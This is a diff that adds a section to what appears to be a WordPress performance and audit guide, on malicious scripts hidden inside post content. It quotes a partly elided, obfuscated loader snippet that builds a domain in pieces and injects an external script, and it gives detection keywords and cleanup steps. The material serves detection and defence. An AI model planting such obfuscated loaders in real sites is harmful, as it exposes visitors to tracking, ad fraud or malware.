@@ -260,6 +260,31 @@ This guarantees execution order without relying on trigger timing assumptions.
 
 ---
 
+## Scripts injected into post content
+
+A third-party footprint audit usually inventories scripts in the theme, plugins and tag
+manager. It misses scripts stored inside `post_content`, which only load on the affected
+posts. Real pattern found on a WordPress site:
+
+```js
+(function(){
+  q=document.createElement("script"); q_=("us")+("ta"); q_+="t"+("."); q_+=("in");
+  ...
+  q.src="https://"+q_+qu; document.body.appendChild(q);
+})();
+```
+
+The domain is built in pieces so a plain text search for it finds nothing. It loads an
+external tracking or ad-fraud script on every visit to that post.
+
+Detection: scan raw content (`context=edit` via REST, or the database) for `<script>`
+blocks that are not JSON-LD and contain `createElement`, `appendChild`, `eval(`, `atob(`,
+`fromCharCode` or `document.write`. Exclude the site's own widgets by context.
+
+Fix: remove the whole `<script>` block, treat it as a security finding (how did it get
+in: compromised account, plugin, copied content?) and search options and widgets for the
+same pattern. See `wordpress-hidden-errors` (pattern C7).
+
 ## Removing unused scripts
 
 1. Identify unused scripts via Coverage tab or GTM audit
